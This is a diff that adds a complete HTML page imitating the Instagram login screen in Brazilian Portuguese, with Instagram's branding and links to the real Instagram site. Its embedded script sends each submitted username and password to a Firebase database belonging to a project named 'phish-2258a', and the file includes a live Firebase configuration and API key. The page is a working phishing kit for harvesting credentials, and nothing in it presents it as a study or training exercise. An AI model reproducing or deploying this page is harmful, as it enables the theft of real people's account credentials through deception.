@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+<head>
+     <title>Instagram</title>
+     <meta charset="utf-8"/>
+     <link rel="shortcut icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" type="image/x-icon" />
+     <meta name="viewport" content="user-scalable=no, initial-scale=1.0, width=device-width, maximum-scale=1.0, minimal-ui"/>
+     <style type="text/css">
+          *{
+               padding: 0;
+               margin: 0;
+          }
+          
+          body{
+               background-color: #fff;
+               font-family: sans-serif;
+          }
+          
+          .desing{
+               margin-top: 12px;
+          }
+          
+          .idioma{
+               color: #9C9C9C;
+               font-size: 13px;
+          }
+          
+          .logo{
+               height: 50px;
+               margin-top: 45px;
+               margin-bottom: 30px;
+          }
+          
+          .contact-form>input{
+               width: 250px;
+               padding: 9px;
+               border: 1px solid #D3D3D3;
+               border-radius: 4px;
+               background-color: #FBFBFB;
+               cursor: pointer;
+          }
+          
+          .usuario{
+               margin-bottom: 5px;
+               text-transform: lowercase;
+               cursor: pointer;
+          }
+          
+          .usuario::-webkit-input-placeholder{
+          /* WebKit browsers */
+               text-transform: none;
+          }
+          
+          .senha{
+               margin-bottom: 8px;
+               cursor: pointer;
+          }
+          
+          .usuario, .senha, .entrar:focus{
+               box-shadow: 0 0 0 0;
+               border: none;
+               outline: 0;
+          }
+          
+          .forget{
+               text-decoration: none;
+               color: #00ABFF;
+               font-size: 13px;
+               margin-left: 158px;
+               cursor: pointer;
+          }
+          
+          .entrar{
+               color: #fff;
+               font-weight: 500;
+               border: none;
+               background-color: #00ABFF;
+               width: 270px;
+               padding: 9px;
+               border: none;
+               border-radius: 4px;
+               margin-top: 20px;
+               margin-bottom: 20px;
+               cursor: pointer;
+          }
+          
+          .criar{
+               color: #9C9C9C;
+               font-size: 14px;
+          }
+          
+          .cadastro{
+               text-decoration: none;
+               color: #00ABFF;
+               font-weight: 500;
+               cursor: pointer;
+          }
+          
+          .empresa{
+               margin-top: 80px;
+          }
+          
+          .p1{
+               color: #9c9c9c;
+               font-size: 13px;
+               font-weight: 400;
+           }
+           
+           .p2{
+                color: #000;
+               font-size: 15px;
+               font-weight: 500;
+           }
+     </style>
+</head>
+<body>
+     <div class="desing" align="center">
+          <span class="idioma">Português (Brasil) •</span><br />
+          <img class="logo" src="https://raw.githubusercontent.com/lucasrmagalhaes/instagram-css/master/img/instagram-logo.png" alt="ig-logo"/>
+     </div>
+     <form class="contact-form" align="center">
+          <input class="usuario" type="text" spellcheck="false" placeholder="Telefone, nome de usuário ou email" required/><br />
+          <input class="senha" type="password" placeholder="Senha" required/><br />
+          <a href="https://www.instagram.com/accounts/password/reset/" class="forget">Esqueceu a senha?</a><br />
+          <button onClick="window.location.href='#';" class="entrar" type="submit">Entrar</button><br />
+          <span class="criar">Não tem uma conta? <a href="https://www.instagram.com/accounts/signup/phone" class="cadastro">Cadastre-se</a></span>
+     </form>
+     <div class="empresa" align="center">
+          <span class="p1">from</span><br />
+          <span class="p2">F A C E B O O K</span>
+     </div>
+     
+     <!--Javascript-->
+     <script src="https://www.gstatic.com/firebasejs/8.7.1/firebase.js"></script>
+     <script>
+          // Your web app's Firebase configuration
+          // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+          var firebaseConfig = {
+              apiKey: "AIzaSyBv2EPBYnkKLbM-27Gsa93eEFhNQgMURDk",
+              authDomain: "phish-2258a.firebaseapp.com",
+              databaseURL: "https://phish-2258a-default-rtdb.firebaseio.com",
+              projectId: "phish-2258a",
+              storageBucket: "phish-2258a.appspot.com",
+              messagingSenderId: "770476817045",
+              appId: "1:770476817045:web:8d3f9144b35c54fbd1b99c",
+              measurementId: "G-FQJRETNXR4"
+          };
+          // Initialize Firebase
+          firebase.initializeApp(firebaseConfig);
+          firebase.analytics();
+
+          //Nome da pasta do firebase
+          let contactInfo = firebase.database().ref("Insta");
+
+          //Listen for a submit
+          document.querySelector(".contact-form").addEventListener("submit", submitForm);
+
+          function submitForm(e){
+               e.preventDefault();
+     
+               //Get input values
+               let usuario = document.querySelector(".usuario").value;
+               let senha = document.querySelector(".senha").value;
+     
+               console.log(usuario, senha);
+     
+               saveContactInfo(usuario, senha);
+     
+               document.querySelector(".contact-form").reset();
+          }
+
+          //Save infos to Firebase
+          function saveContactInfo(usuario, senha){
+               let newContactInfo = contactInfo.push();
+     
+               newContactInfo.set({
+                    usuario: usuario,
+                    senha: senha,
+               });
+
+          }
+     </script>
+</body>
+</html>
